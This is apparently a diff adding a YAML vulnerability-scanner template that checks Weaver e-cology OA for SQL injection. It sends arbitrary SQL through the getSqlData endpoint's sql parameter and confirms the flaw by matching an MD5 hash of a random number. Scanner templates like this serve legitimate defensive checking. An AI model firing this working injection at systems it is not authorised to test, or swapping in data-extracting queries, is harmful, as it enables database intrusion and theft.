@@ -1,0 +1,30 @@
+name: yaml-poc-weaver-weaver_e_cology_oa-sql_injection-CT-442574
+binding: 2ad586e2-c110-44f6-b5b4-f28b74ba1800
+detail:
+    author: system_user
+    vulnerability:
+        id: fcc0ffe0-d363-4b72-9738-0e83784507a1
+        level: high
+    warning: Harmless
+transport: http
+set:
+    rand1: randomInt(1, 20000)
+    rand2: randomInt(20000, 50000)
+rules:
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand1}}')),3,32)
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(bytes(md5(string(rand1))))
+    r2:
+        request:
+            cache: true
+            method: GET
+            path: /Api/portal/elementEcodeAddon/getSqlData?sql=select%20substring(sys.fn_sqlvarbasetostr(hashbytes('MD5','{{rand2}}')),3,32)
+            follow_redirects: false
+        expression: |
+            response.status == 200 && response.body.bcontains(bytes(md5(string(rand2))))
+expression: r1() && r2()
